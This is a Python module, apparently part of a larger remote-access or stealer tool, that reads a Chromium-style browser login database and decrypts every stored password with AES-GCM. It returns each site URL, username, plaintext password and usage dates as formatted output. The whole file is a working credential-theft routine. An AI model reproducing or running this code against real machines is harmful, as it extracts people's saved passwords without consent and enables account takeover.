from CryptoAc.Symmetric.AEScrypto import AES, AESencryption
from Design.des import Color,colorama
from os import remove,listdir
import sqlite3
import datetime



# from main import Server,os
# from tempfile import gettempdir

class WebPass(object):
    
    def _decrypt_password(self,key,iv,en_pass):
        try:
            return self.decryptgcm(key,iv,en_pass)[:-16].decode()
        except Exception as e:
            print(e)
            return 'null'

    def decryptgcm(self,key,iv,data):
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)

    def extractTime(self,microTime):
        return str(datetime.datetime(1601,1,1) + datetime.timedelta(microseconds=microTime))

    def show(self,path,key,collor=False):
        if collor:res,l,r,g,rs = str(),Color().lYellow,Color().lRed,Color().lgreen,colorama.Style.RESET_ALL
        else:res,l,r,g,rs = str(),str(),str(),str(),str()
        try:
            conn = sqlite3.connect(path)
            cursor = conn.cursor()
            cursor.execute("""select origin_url,
                    date_last_used, 
                    date_created, 
                    username_value, 
                    password_value 
                from logins ORDER BY  date_created"""
            )
            for n in cursor.fetchall()[::-1]:
                try:
                    url,last,creat,user,passwd = n
                    passwd = self._decrypt_password(key,passwd[3:15],passwd[15:])
                    last,creat = self.extractTime(last),self.extractTime(creat)
                    if not passwd: continue
                    res += f"{l+'Url':<20}{g}{url}{rs}\n{l+'Created':<20}{g+creat+rs}\n"
                    res += f"{l+'Last used':<20}{g+last+rs}\n{l+'User Name':<20}{g+user+rs}\n"
                    res += f"{l+'Password':<20}{r+passwd}\n{l+'-'*30}{rs}\n\n"
                    res += rs
                except Exception as e:
                    pass
        except Exception as e: 
            pass
        try:
            cursor.close()
            conn.close()
        except:pass
        return res





    
    
        


